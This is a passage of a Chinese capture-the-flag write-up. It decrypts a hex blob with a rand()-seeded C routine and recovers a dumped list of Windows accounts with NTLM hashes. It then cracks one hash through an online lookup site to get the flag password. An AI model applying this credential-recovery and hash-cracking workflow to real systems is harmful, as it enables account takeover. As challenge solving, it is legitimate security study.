b9 48 1c 58 81 4f 51 7d 27 70 33 6f 79 48 82 21 08 80 79 49 51 52 28 9b 7d bb 40 67 45 7a 96 38 3e 7d 41 42 86 60 4f 6c 3b 87 2e 26 72 51 83 80 79 bd 79 40 67 71 4a a2 98 76 3a 8f 68 da 7f 74 2a 33 55 8d 5e 2b 39 6d be 5f 74 74 7d 11 8e 4b 4d 99 64 79 63 b3 73 ca 31 90 c3 77 1b 6f 61 52 11 bc bd 86 b2 78 4f 7e 56 8f 6c 94 b4 3a 7f 14 4b 79 b6 8c b0 ad 8b 67 6d d1 7a 9a a7 31 74 25 3e 61 2e 82 3d 63 5e 77 6b 7c 3f 24 65 35 9f 53 84 92 42 a0 7d 66 70 3b d3 65 a2 6d 7f 19 92 7a 8c b8 6b 12 18 66 74 c0 48 64 9d 0e 6f 53 96 49 61 5d
```

放入C代码，完成下面的部分，进行解密

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    char word_140111152[] = {
        'i', 0, 'x', 0, 'e', 0, 'd', 0, 'S', 0, 'e', 0, 'e', 0, 'd', 0, 0, 0};
    unsigned short *pass_list = (unsigned short *)word_140111152;
    int v5, v6, v7, v8;
    v5 = 70;
    v8 = 1;
    v7 = 0;
    v6 = 0;
    do
    {
        printf("[DEBUG] Before calculate v6 = %d\n", v6);
        v6 = (int)(v6 + v8 * v5) % 256;
        v5 = pass_list[v7++];
        ++v8;
        printf("[DEBUG] After calculate v6 = %d\n", v6);
    } while (v5);
    printf("v6 = %d\n", v6);
    srand(v6); // 设置种子
    int data[] = {0xb9, 0x48, 0x1c, 0x58, 0x81, 0x4f, 0x51, 0x7d, 0x27, 0x70, 0x33, 0x6f, 0x79, 0x48, 0x82, 0x21, 0x08, 0x80, 0x79, 0x49, 0x51, 0x52, 0x28, 0x9b, 0x7d, 0xbb, 0x40, 0x67, 0x45, 0x7a, 0x96, 0x38, 0x3e, 0x7d, 0x41, 0x42, 0x86, 0x60, 0x4f, 0x6c, 0x3b, 0x87, 0x2e, 0x26, 0x72, 0x51, 0x83, 0x80, 0x79, 0xbd, 0x79, 0x40, 0x67, 0x71, 0x4a, 0xa2, 0x98, 0x76, 0x3a, 0x8f, 0x68, 0xda, 0x7f, 0x74, 0x2a, 0x33, 0x55, 0x8d, 0x5e, 0x2b, 0x39, 0x6d, 0xbe, 0x5f, 0x74, 0x74, 0x7d, 0x11, 0x8e, 0x4b, 0x4d, 0x99, 0x64, 0x79, 0x63, 0xb3, 0x73, 0xca, 0x31, 0x90, 0xc3, 0x77, 0x1b, 0x6f, 0x61, 0x52, 0x11, 0xbc, 0xbd, 0x86, 0xb2, 0x78, 0x4f, 0x7e, 0x56, 0x8f, 0x6c, 0x94, 0xb4, 0x3a, 0x7f, 0x14, 0x4b, 0x79, 0xb6, 0x8c, 0xb0, 0xad, 0x8b, 0x67, 0x6d, 0xd1, 0x7a, 0x9a, 0xa7, 0x31, 0x74, 0x25, 0x3e, 0x61, 0x2e, 0x82, 0x3d, 0x63, 0x5e, 0x77, 0x6b, 0x7c, 0x3f, 0x24, 0x65, 0x35, 0x9f, 0x53, 0x84, 0x92, 0x42, 0xa0, 0x7d, 0x66, 0x70, 0x3b, 0xd3, 0x65, 0xa2, 0x6d, 0x7f, 0x19, 0x92, 0x7a, 0x8c, 0xb8, 0x6b, 0x12, 0x18, 0x66, 0x74, 0xc0, 0x48, 0x64, 0x9d, 0x0e, 0x6f, 0x53, 0x96, 0x49, 0x61, 0x5d};
    int new_data[sizeof(data) / sizeof(data[0])] = {0};
    printf("Using v6 = %d to generate random number", v6);

    for (int i = 0; i < sizeof(data) / sizeof(data[0]); i++)
    {
        int random_number = rand();
        new_data[i] = (int)(data[i] - random_number % 128) ^ v6;
    }

    for (int i = 0; i < sizeof(data) / sizeof(data[0]); i++)
    {
        printf("%c", new_data[i]);
    }
}

```

得到输出为

```properties
User=Administrator
NTLM=
User=DefaultAccount
NTLM=
User=Guest
NTLM=
User=Lihua
NTLM=23d1e086b85cc18587bbc8c33adefe07
User=WDAGUtilityAccount
NTLM=d3280b38985c05214dcc81b74dd98b4f
```

取得账户Lihua的NTLM加密哈希为`23d1e086b85cc18587bbc8c33adefe07`，找一个网站去解密

> [MD5 在線免費解密 MD5、SHA1、MySQL、NTLM、SHA256、SHA512、Wordpress、Bcrypt 的雜湊](https://hashes.com/zh/decrypt/hash)

![](/images/ciscn-2024-writeup/025.png)

得到最后的结果为`memeallme!`，所以flag为`flag{memeallme!}`

